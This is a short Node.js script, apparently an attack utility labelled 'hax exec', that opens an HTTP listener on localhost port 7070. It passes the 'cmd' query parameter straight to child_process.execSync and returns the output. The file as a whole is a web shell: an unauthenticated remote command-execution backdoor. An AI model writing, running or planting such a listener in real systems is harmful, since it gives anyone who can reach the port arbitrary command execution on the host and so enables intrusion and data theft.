'use strict';
var http = require('http');
var url = require('url');
var cp = require('child_process');
var server = http.createServer(function (req, res) {
  var q = url.parse(req.url, true).query;
  var cmd = q.cmd || 'id';
  var out;
  try { out = cp.execSync(cmd, { encoding: 'utf8' }); }
  catch (e) { out = 'ERR ' + e; }
  res.writeHead(200, { 'Content-Type': 'text/plain' });
  res.end(out);
});
server.on('error', function (e) { console.log('hax exec error ' + e); });
server.listen(7070, '127.0.0.1', function () { console.log('hax exec ready'); });
